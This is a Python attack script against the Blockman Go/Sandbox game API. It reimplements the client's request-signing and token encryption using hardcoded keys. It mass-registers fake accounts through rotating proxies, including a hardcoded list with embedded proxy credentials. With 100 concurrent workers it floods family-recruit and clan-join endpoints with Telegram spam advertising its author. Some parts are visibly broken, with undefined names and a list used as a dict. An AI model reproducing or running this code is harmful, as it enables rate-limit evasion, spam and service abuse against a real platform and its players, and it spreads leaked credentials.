import asyncio
import base64
import hashlib
import random
import uuid
import time
import re

import aiohttp
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from aiohttp_socks import ProxyConnector
import icmplib
from PyRoxy import ProxyChecker, ProxyUtiles

#PROXY_WORK = [f"socks5://127.0.0.1:{port}" for port in range(9001, 9032)]
PROXY_WORK = [
    "http://TVMgC1:PvSocCXUFR@46.8.23.87:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.23.92:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.23.188:3000",
    "http://TVMgC1:PvSocCXUFR@109.248.54.19:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.155.53:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.155.143:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.155.230:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.220.169:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.221.15:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.218.70:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.157.15:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.193.237:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.185.21:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.185.190:3000",
    "http://TVMgC1:PvSocCXUFR@95.182.125.71:3000",
    "http://TVMgC1:PvSocCXUFR@95.182.125.238:3000",
    "http://TVMgC1:PvSocCXUFR@95.182.127.254:3000",
    "http://TVMgC1:PvSocCXUFR@212.115.49.155:3000",
    "http://TVMgC1:PvSocCXUFR@212.115.49.163:3000",
    "http://TVMgC1:PvSocCXUFR@45.90.196.79:3000",
    "http://TVMgC1:PvSocCXUFR@194.35.113.224:3000",
    "http://TVMgC1:PvSocCXUFR@194.35.113.233:3000",
    "http://TVMgC1:PvSocCXUFR@45.11.20.21:3000",
    "http://TVMgC1:PvSocCXUFR@45.81.137.250:3000",
    "http://TVMgC1:PvSocCXUFR@2.59.50.3:3000",
    "http://TVMgC1:PvSocCXUFR@45.86.1.3:3000",
    "http://TVMgC1:PvSocCXUFR@45.86.1.223:3000",
    "http://TVMgC1:PvSocCXUFR@45.87.253.52:3000",
    "http://TVMgC1:PvSocCXUFR@109.248.205.71:3000",
    "http://TVMgC1:PvSocCXUFR@109.248.14.109:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.136.250:3000",
    "http://TVMgC1:PvSocCXUFR@109.248.12.44:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.128.170:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.129.158:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.22.181:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.22.184:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.23.22:3000",
    "http://TVMgC1:PvSocCXUFR@188.130.211.138:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.213.159:3000",
    "http://TVMgC1:PvSocCXUFR@46.8.154.161:3000"
]
WORKERS = [
    "https://super-flower-5d48.kolyagrozy.workers.dev/",
    "https://orange-queen-66f1.kolyagrozy.workers.dev/",
    "https://fragrant-lake-e1b5.kolyagrozy.workers.dev/",
    "https://lively-sky-e832.kolyagrozy.workers.dev/",
    "https://old-shape-83cc.kolyagrozy.workers.dev/",
    "https://aged-shadow-7152.kolyagrozy.workers.dev/",
    "https://yellow-hill-44c0.kolyagrozy.workers.dev/",
    "https://raspy-rice-d1bf.kolyagrozy.workers.dev/",
    "https://soft-bird-d002.kolyagrozy.workers.dev/",
    "https://holy-tree-3299.kolyagrozy.workers.dev/"
    "https://muddy-glitter-8f0e.kolyagrozy.workers.dev/",
    "https://round-base-300d.kolyagrozy.workers.dev/",
    "https://polished-leaf-af96.kolyagrozy.workers.dev/",
    "https://weathered-cloud-61d3.kolyagrozy.workers.dev/",
    "https://sparkling-dust-ac4e.kolyagrozy.workers.dev/"
]

def get_xsign(path, nonce, time, params, android_id):
    md5 = hashlib.md5(f"6aDtpIdzQdgGwrpP6HzuPA{path}{nonce}{time}{params}9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s".encode()).hexdigest()

    if path in ENDPOINTS or (path.startswith("/config/files/") or path.startswith("/config/ml/files/")):
        return md5
    return hashlib.md5(f"{md5}{android_id}".encode()).hexdigest()

def get_enc_token(no_enc_token):
    data = pad(bytes(b ^ 0x73 for b in no_enc_token.encode()), 16)

    secret = hashlib.md5(b"9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s").hexdigest()

    cipher = AES.new(secret[:16].encode(), AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data)).decode()

def get_enc_query(android_id, nonce):
    key = RSA.import_key(base64.b64decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCLzlsA+3wXCAph80r/xs1bWhVrsJSOQmSBTA0GaBpVIzXqFBaibDmYA3WJDM9rcQ7KpYSyrJ02iFlsN43RnizrHfS+xPtdwuxBQ2Clow5cYPZucqQYL9HIlbBLoighH2eGQqGlVadL7r384iKTz9mmckSUa8hhJzS+WwUAqVO3DwIDAQAB"))
    cipher = PKCS1_v1_5.new(key)
    query = f"0\n{android_id}\n{nonce}".encode()
    encrypted = b""
    for i in range(0, len(query), 117):
        chunk = query[i:i+117]
        encrypted += cipher.encrypt(chunk)
    return base64.b64encode(encrypted).decode()

def get_android_sign(android_id):
    xored_data = bytes(b ^ 0x73 for b in android_id.encode())
    padded_data = pad(xored_data, AES.block_size)

    cipher = AES.new(b"MFwwDQYJKoZIhvcN", AES.MODE_ECB)
    encrypted_bytes = cipher.encrypt(padded_data)

    return base64.b64encode(encrypted_bytes).decode()

DATA_CENTERS = []

async def cdn(session):
    async with session.get("https://pastebin.com/raw/JAUiZzvb") as response:
        ips_text = await response.text()

    ips = [ip.strip() for ip in ips_text.split(",") if ip.strip()]

    async def add_cdn(ip):
        async with session.get(f"https://dns.google/resolve?name=gw.sandboxol.com&type=A&edns_client_subnet={ip}") as response:
            payload = await response.json()
            return [
                answer["data"] for answer in payload.get("Answer", [])
                if answer.get("type") == 1 and "data" in answer
            ]

    while True:
        tasks = (add_cdn(ip) for ip in ips)
        results = await asyncio.gather(*tasks)

        unique_ips = {ip for sublist in results for ip in sublist}

        DATA_CENTERS[:] = sorted(list(unique_ips))
        print(f"DATA_CENTERS updated: {DATA_CENTERS}")

        await asyncio.sleep(6000000000000000000000)

SOCKS = []

async def proxies(session):
    while True:
        global PROXY_WORK

        prx = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks5/data.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/refs/heads/main/proxy_files/socks5_proxies.txt",
            "https://raw.githubusercontent.com/elliottophellia/proxylist/refs/heads/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt",
           # "https://raw.githubusercontent.com/zenjahid/FreeProxy4u/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/databay-labs/free-proxy-list/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/Skillter/ProxyGather/refs/heads/master/proxies/working-proxies-socks5.txt",
            #"https://raw.githubusercontent.com/fyvri/fresh-proxy-list/archive/storage/classic/socks5.txt",
            "https://raw.githubusercontent.com/zebbern/Proxy-Scraper/refs/heads/main/socks5.txt"
        ]

        send = 0
        total = 0
        naxui = random.randint(1000, 9999)
        for url in prx:
            send += 1
            try:
                async with session.get(url, timeout=5) as response:
                    req = await response.text()
                req = re.sub(r"^\s+|\s+$", "", re.sub(r"^\s*$\n?", "", req, flags=re.MULTILINE), flags=re.MULTILINE).splitlines()

                if "socks5" in url:
                    req = ["socks5://" + prox.lstrip("socks5://") for prox in req]

                elif "socks4" in url:
                    req = ["socks4://" + prox.lstrip("socks4://") for prox in req]

                elif "https" in url:
                    req = ["https://" + prox.lstrip("https://") for prox in req]

                elif "http" in url:
                    req = ["http://" + prox.lstrip("http://") for prox in req]

                total += len(req)
                print(f"[{send}]", url, f"| {len(req)}")

                with open(f"bazadian{naxui}.txt", "a", encoding="utf-8") as f:
                    f.write("\n".join([re.sub(r"^(([^:]+:){2}[^:]+):.*$", r"\1", prox) for prox in req]) + "\n")
            except Exception as e:
                print(e)

        print(f"total {total}\n")

        proxies_list = ProxyUtiles.readFromFile(f"bazadian{naxui}.txt")

        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None, ProxyChecker.checkAll, proxies_list
        )
        print("all proxy checked")

        SOCKS = [str(proxy) for proxy in result]

        print(f"Found {len(SOCKS)} working proxies.")
        await asyncio.sleep(300)

async def update_endpoints(session):
    global ENDPOINTS

    async with session.get("https://pastebin.com/raw/zYLkEaLv") as response:
        ENDPOINTS = (await response.text()).split(",")

def parse_vless_to_xray_json(vless_link: str) -> str:
    print(vless_link)
    def is_valid_hostname(hostname):
        if not hostname or len(hostname) > 255:
            return False
        if hostname[-1] == ".":
            hostname = hostname[:-1]
        allowed = re.compile(r"(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
        return all(allowed.match(x) for x in hostname.split("."))

    try:
        vless_link = vless_link.strip().replace('&amp;', '&')
        
        parsed_url = urlparse(vless_link)
        params = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}

        outbound_config = {
            "protocol": "vless",
            "tag": unquote(parsed_url.fragment or "proxy"),
            "settings": {
                "vnext": [
                    {
                        "address": parsed_url.hostname,
                        "port": parsed_url.port,
                        "users": [
                            {
                                "id": parsed_url.username,
                                "encryption": params.get("encryption", "none"),
                                "flow": params.get("flow", "")
                            }
                        ]
                    }
                ]
            },
            "streamSettings": {
                "network": params.get("type", "tcp"),
                "security": params.get("security", "none") if params.get("security") is not None else "none"
            }
        }

        network = outbound_config["streamSettings"]["network"]
        if network == "ws":
            outbound_config["streamSettings"]["wsSettings"] = {
                "path": params.get("path", "/"),
                "headers": {"Host": params.get("host", parsed_url.hostname)}
            }
        elif network == "grpc":
            outbound_config["streamSettings"]["grpcSettings"] = {
                "serviceName": params.get("serviceName", ""),
                "multiMode": True if params.get("mode") == "multi" else False
            }
        elif network == "tcp" and params.get("headerType") == "http":
            outbound_config["streamSettings"]["tcpSettings"] = {
                "header": {
                    "type": "http",
                    "request": {
                        "path": ["/"],
                        "headers": {"Host": [params.get("host", parsed_url.hostname)]}
                    }
                }
            }

        security = outbound_config["streamSettings"]["security"]
        if security in ["tls", "reality"]:
            # ЛОГИКА ИСПРАВЛЕНИЯ КРИВОГО SNI
            sni_candidate = params.get("sni")
            host_candidate = params.get("host", parsed_url.hostname)
            
            final_sni = host_candidate
            if sni_candidate and is_valid_hostname(sni_candidate):
                final_sni = sni_candidate

            if security == "tls":
                tls_settings = {"serverName": final_sni}
                if "fp" in params:
                    tls_settings["fingerprint"] = params["fp"]
                if "alpn" in params:
                    tls_settings["alpn"] = unquote(params["alpn"]).split(',')
                outbound_config["streamSettings"]["tlsSettings"] = tls_settings
            
            elif security == "reality":
                reality_settings = {"serverName": final_sni}
                if "pbk" in params:
                    reality_settings["publicKey"] = params["pbk"]
                if "fp" in params:
                    reality_settings["fingerprint"] = params["fp"]
                if "sid" in params:
                    reality_settings["shortId"] = params["sid"]
                outbound_config["streamSettings"]["realitySettings"] = reality_settings
        
        local_port = random.randint(10000, 20000)

        full_config = {
            "inbounds": [
                {
                    "listen": "127.0.0.1",
                    "port": local_port,
                    "protocol": "socks",
                    "settings": {
                        "auth": "noauth",
                        "udp": True
                    },
                    "tag": "socks-in"
                }
            ],
            "outbounds": [
                outbound_config,
                {"protocol": "freedom", "tag": "direct"},
                {"protocol": "blackhole", "tag": "block"}
            ]
        }

        return json.dumps(full_config, indent=2)

    except Exception as e:
        print(f"Error parsing link '{vless_link}': {e}")
        return "{}"

VLESS = []

async def vless(session):
    async with session.get("https://raw.githubusercontent.com/ebrasha/free-v2ray-public-list/refs/heads/main/vless_configs.txt") as response:
        result = (await response.text()).strip().split("\n")[-2500:]

    result = [f"{match.group(1)}:{match.group(2)}:{''.join(line.split())}" for line in result if (match := __import__('re').search(r'vless://(?:.*@)?((?:(?:\d{1,3}\.){3}\d{1,3})|\[[^\]]+\]):(\d+)', line.strip()))]

    hosts_to_ping = [server.split(":")[0] for server in result if server]

    multiping_results = await icmplib.async_multiping(hosts_to_ping, count=1, timeout=1, concurrent_tasks=2500, privileged=False)

    VLESS_PING = []

    for host in multiping_results:
        if host.is_alive:
            print(host.address)
            VLESS_PING.append(next(s.split(":", 2)[2] for s in result if s.startswith(host.address + ":")))

    print(parse_vless_to_xray_json(random.choice(VLESS_PING)))

async def main():
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=0)
    ) as session:
        asyncio.create_task(update_endpoints(session))
        asyncio.create_task(cdn(session))
        asyncio.create_task(proxies(session))
       # asyncio.create_task(vless(session))
    #    await asyncio.sleep(200)
        while True:
            if not SOCKS:
                await asyncio.sleep(0.01)
                continue
            break
        while True:
            if not DATA_CENTERS:
                await asyncio.sleep(0.01)
                continue
            break
        lock = asyncio.Lock()
        asyncio.create_task(create_accounts(session, lock))
        await asyncio.sleep(15)
        asyncio.create_task(flood_s(session, lock))
        await asyncio.sleep(9999999999999999999999999999999999999999)

ACCOUNTS = []
ABUSE = []

async def cr(session, lock):
    global ABUSE
    while True:
        #async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
        kr = "js"
        if kr == "js":
            android_id = "".join(random.choice("0123456789abcdef") for _ in range(16))
            nonce = str(uuid.uuid4())
            query = get_enc_query(android_id, nonce)
            android_sign = get_android_sign(android_id)
            xtime = str(int(time.time()))
            xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}", android_id)
            prx = random.choice(PROXY_WORK)
            async with lock:
                if ABUSE.get(prx, (0, 0))[0] >= 3:
                    if prx in ABUSE and (__import__("time").time() - ABUSE[prx][1]) >= 30:
                        ABUSE[prx] = (0, __import__("time").time())
                        print("Число регистрации сброшено")
                    else:
                        continue
            try:
                async with session.get(
                    f"https://{random.choice(DATA_CENTERS)}/user/api/v5/account/auth-token",
                    timeout=2,
                    proxy=prx,
                    params={"q":query},
                    headers={
                        "bmg-user-id": "0",
                        "bmg-device-id": android_id,
                        "bmg-sign": android_sign,
                        "bmg-adid-sign": "98a580c5182455f00f732f48233928706925543c",
                        "package-name": "com.sandboxol.blockymods",
                        "userId": "0",
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": "ru",
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": "0",
                        "device_register_ts": "0",
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": "ru_RU",
                        "region": "",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "telecomOper": "unknown",
                        "manufacturer": "Redmi_Redmi Note 8 Pro",
                        "network": "wifi",
                        "brand": "Redmi",
                        "model": "Redmi Note 8 Pro",
                        "device": "begonia",
                        "deviceModel": "Redmi Note 8 Pro",
                        "board": "begonia",
                        "cpu": "CPU architecture: 8",
                        "cpuFrequency": "2012500",
                        "dpi": "2.75",
                        "screenHeight": "2220",
                        "screenWidth": "1080",
                        "ram_memory": "5635",
                        "rom_memory": "52438",
                        "open_id": "",
                        "open_id_type": "0",
                        "client_ip": "",
                        "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/user/api/v5/account/auth-token",
                        "Access-Token": "",
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    print(await response.text())
                    if (await response.json())["code"] == 1:
                        async with lock: ABUSE[prx] = (ABUSE.get(prx, (0, 0))[0] + 1, __import__("time").time())
                        answer = await response.json()
                        user_id = str(int(answer["data"]["userId"]))
                        token = answer["data"]["accessToken"]
                        register_time = str(int(answer["data"]["registerTime"]))
                        device_register_time = str(int(answer["data"]["deviceRegisterTime"]))
                        nickname = "kn_ew.tg_" + uuid.uuid4().hex[:11]
                        nonce = str(uuid.uuid4())
                        xtime = str(int(time.time()))
                        a = "{"
                        b = "}"
                        body_string = f'{{"decorationPicUrl":"http://static.sandboxol.com/sandbox/avatar/male.png","inviteCode":"","details":"httрs://t.mе/kn_ew (in telegram @kn_ew)\\nBruteforce account","decorationPicUrl":"http://staticgs.sandboxol.com/avatar/1761508908718930.jpg","nickName":"{nickname}","picType":1,"sex":1}}'
                        xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                        async with session.post(
                            f"https://{random.choice(DATA_CENTERS)}/user/api/v1/user/register",
                            timeout=2,
                            proxy=prx,
                            data=body_string.encode(),
                            headers={
                                "bmg-device-id": android_id,
                                "userId": user_id,
                                "packageName": "official",
                                "packageNameFull": "com.sandboxol.blockymods",
                                "androidVersion": "30",
                                "OS": "android",
                                "appType": "android",
                                "appLanguage": "ru",
                                "appVersion": "5421",
                                "appVersionName": "2.125.1",
                                "channel": "sandbox",
                                "uid_register_ts": register_time,
                                "device_register_ts": device_register_time,
                                "eventType": "app",
                                "userDeviceId": android_id,
                                "userLanguage": "ru_RU",
                                "region": "RU",
                                "clientType": "client",
                                "env": "prd",
                                "package_name_en": "com.sandboxol.blockymods",
                                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                                "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "telecomOper": "unknown",
                                "manufacturer": "Redmi_Redmi Note 8 Pro",
                                "network": "wifi",
                                "brand": "Redmi",
                                "model": "Redmi Note 8 Pro",
                                "device": "begonia",
                                "deviceModel": "Redmi Note 8 Pro",
                                "board": "begonia",
                                "cpu": "CPU architecture: 8",
                                "cpuFrequency": "2012500",
                                "dpi": "2.75",
                                "screenHeight": "2220",
                                "screenWidth": "1080",
                                "ram_memory": "5635",
                                "rom_memory": "52438",
                                "open_id": "",
                                "open_id_type": "0",
                                "client_ip": "",
                                "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                                "X-Nonce": nonce,
                                "X-Time": xtime,
                                "X-Sign": xsign,
                                "X-UrlPath": "/user/api/v1/user/register",
                                "Access-Token": get_enc_token(token + nonce),
                                "Content-Type": "application/json; charset=UTF-8",
                                "Host": "gw.sandboxol.com",
                                "Connection": "Keep-Alive",
                                "Accept-Encoding": "gzip",
                                "User-Agent": "okhttp/4.10.0"
                            }
                        ) as response:
                            if (await response.json())["code"] == 1:
                                answer = await response.json()
                                token = answer["data"]["accessToken"]
                                register_time = str(int(answer["data"]["registerTime"]))
                                async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
            except Exception as e:
                print(e)

async def create_accounts(session, lock):
    tasks = [asyncio.create_task(cr(session, lock)) for _ in range(1)]
    await asyncio.gather(*tasks)

async def flood_s(session, lock):
    async def flood_k():
        while True:
            if not ACCOUNTS:
                continue
            async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(SOCKS), ssl=False, limit=0)) as session:
                account = random.choice(ACCOUNTS)
                user_id, token, android_id, register_time, device_register_time = account.split(":")
                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
                region = "en_US"
                try:
                    async with session.delete(
                        f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                        timeout=2,
                        headers={
                            "userId": user_id,
                            "packageName": "official",
                            "packageNameFull": "com.sandboxol.blockymods",
                            "androidVersion": "30",
                            "OS": "android",
                            "appType": "android",
                            "appLanguage": region[:2],
                            "appVersion": "5421",
                            "appVersionName": "2.125.1",
                            "channel": "sandbox",
                            "uid_register_ts": register_time,
                            "device_register_ts": device_register_time,
                            "eventType": "app",
                            "userDeviceId": android_id,
                            "userLanguage": region,
                            "region": "RU",
                            "clientType": "client",
                            "env": "prd",
                            "package_name_en": "com.sandboxol.blockymods",
                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                            "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                            "X-Nonce": nonce,
                            "X-Time": xtime,
                            "X-Sign": xsign,
                            "X-UrlPath": "/friend/api/v1/family/recruit",
                            "Access-Token": get_enc_token(token + nonce),
                            "Host": "gw.sandboxol.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip",
                            "User-Agent": "okhttp/4.10.0"
                        }
                    ) as response:
                        pass

                    nonce = str(uuid.uuid4())
                    xtime = str(int(time.time()))
                    a = "{"
                    b = "}"
                    aa = random.choice(["1", "2", "3", "4"])
                    bb = random.choice(["1", "2", "3", "4"])
                    body_string = f'{{"age":0,"memberName":"Старший брат","memberType":{aa},"msg":"","ownerName":"Старший брат","ownerType":{bb}}}'
                    xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, body_string, android_id)
                    async with session.post(
                        f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                        data=body_string.encode(),
                        timeout=2,
                        headers={
                            "language": region,
                            "userId": user_id,
                            "packageName": "official",
                            "packageNameFull": "com.sandboxol.blockymods",
                            "androidVersion": "30",
                            "OS": "android",
                            "appType": "android",
                            "appLanguage": region[:2],
                            "appVersion": "5421",
                            "appVersionName": "2.125.1",
                            "channel": "sandbox",
                            "uid_register_ts": register_time,
                            "device_register_ts": device_register_time,
                            "eventType": "app",
                            "userDeviceId": android_id,
                            "userLanguage": region,
                            "region": "RU",
                            "clientType": "client",
                            "env": "prd",
                            "package_name_en": "com.sandboxol.blockymods",
                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                            "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                            "X-Nonce": nonce,
                            "X-Time": xtime,
                            "X-Sign": xsign,
                            "X-UrlPath": "/friend/api/v1/family/recruit",
                            "Access-Token": get_enc_token(token + nonce),
                            "Content-Type": "application/json; charset=UTF-8",
                            "Host": "gw.sandboxol.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip",
                            "User-Agent": "okhttp/4.10.0"
                        }
                    ) as response:
                        pass
                except Exception as e:
                    print(e)

    tasks = [asyncio.create_task(flood_k()) for _ in range(100)]
    await asyncio.gather(*tasks)

async def clan_flood(session, clan_id, region):
    nonce = str(uuid.uuid4())
    xtime = str(int(time.time()))
    account = random.choice(ACCOUNTS)
    user_id, token, android_id, register_time, device_register_time = account.split(":")
    body_string = f'{{"clanId":{clan_id},"msg":"httрs://t.mе/kn_ew (in telegram @kn_ew)"}}'
    xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, body_string, android_id)
    try:
        async with session.post(
            f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
            timeout=2,
            data=body_string,
            headers={
                "language": region,
                "userId": user_id,
                "packageName": "official",
                "packageNameFull": "com.sandboxol.blockymods",
                "androidVersion": "30",
                "OS": "android",
                "appType": "android",
                "appLanguage": region[:2],
                "appVersion": "5421",
                "appVersionName": "2.125.1",
                "channel": "sandbox",
                "uid_register_ts": register_time,
                "device_register_ts": device_register_time,
                "eventType": "app",
                "userDeviceId": android_id,
                "userLanguage": region,
                "region": "RU",
                "clientType": "client",
                "env": "prd",
                "package_name_en": "com.sandboxol.blockymods",
                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                "X-Nonce": nonce,
                "X-Time": xtime,
                "X-Sign": xsign,
                "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                "Access-Token": get_enc_token(token + nonce),
                "Content-Type": "application/json; charset=UTF-8",
                "Host": "gw.sandboxol.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            }
        ) as response:
            print(await response.json())
            if (await response.json())[code] == 1:
                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, "", android_id)
                async with session.get(
                    f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
                    timeout=2,
                    headers={
                        "language": region,
                        "userId": user_id,
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": region[:2],
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": register_time,
                        "device_register_ts": device_register_time,
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": region,
                        "region": "RU",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                        "Access-Token": get_enc_token(token + nonce),
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    print(await response.json())
    except Exception as e:
        print(e)
        return

async def clan_parsing(session):
    while True:
        nonce = str(uuid.uuid4())
        xtime = str(int(time.time()))
        account = random.choice(ACCOUNTS)
        user_id, token, android_id, register_time, device_register_time = account.split(":")
        xsign = get_xsign("/clan/api/v1/clan/tribe/recommendation", nonce, xtime, "", android_id)
        region = random.choice(
            [
                "zh_CN",
                "en_US",
                "de_DE",
                "es_ES",
                "fr_FR",
                "hi_IN",
                "in_ID",
                "it_IT",
                "ja_JP",
                "ko_KR",
                "pl_PL",
                "pt_PT",
                "ru_RU",
                "th_TH",
                "tr_TR",
                "uk_UA",
                "vi_VN"
            ]
        )
        try:
            async with session.get(
                f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/recommendation",
                timeout=2,
                headers={
                    "language": region,
                    "userId": user_id,
                    "packageName": "official",
                    "packageNameFull": "com.sandboxol.blockymods",
                    "androidVersion": "30",
                    "OS": "android",
                    "appType": "android",
                    "appLanguage": region[:2],
                    "appVersion": "5421",
                    "appVersionName": "2.125.1",
                    "channel": "sandbox",
                    "uid_register_ts": register_time,
                    "device_register_ts": device_register_time,
                    "eventType": "app",
                    "userDeviceId": android_id,
                    "userLanguage": region,
                    "region": "RU",
                    "clientType": "client",
                    "env": "prd",
                    "package_name_en": "com.sandboxol.blockymods",
                    "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                    "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                    "X-Nonce": nonce,
                    "X-Time": xtime,
                    "X-Sign": xsign,
                    "X-UrlPath": "/clan/api/v1/clan/tribe/recommendation",
                    "Access-Token": get_enc_token(token + nonce),
                    "Host": "gw.sandboxol.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "User-Agent": "okhttp/4.10.0"
                }
            ) as response:
                data = await response.json()
                clan_ids = [
                    clan["clanId"]
                    for clan in data["data"]
                    if clan["currentCount"] < clan["maxCount"]
                ]
                if not clan_ids:
                    continue
                await clan_flood(session, random.choice(clan_ids), region)
        except Exception as e:
            print(e)

asyncio.run(main())
